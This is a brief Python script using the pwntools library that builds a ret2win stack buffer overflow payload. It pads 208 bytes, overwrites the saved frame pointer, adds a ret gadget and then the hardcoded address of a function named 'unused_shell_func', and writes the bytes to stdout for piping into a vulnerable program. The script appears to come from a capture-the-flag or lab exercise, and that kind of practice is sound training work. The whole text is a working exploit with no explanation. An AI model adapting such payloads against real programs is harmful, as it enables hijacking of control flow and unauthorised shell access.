from pwn import *

unused_shell_func = 0x0000000000401176
ret = 0x000000000040101a

buf  = b'A' * 208
buf += b'\x42' * 8
buf += p64(ret)
buf += p64(unused_shell_func)

sys.stdout.buffer.write(buf)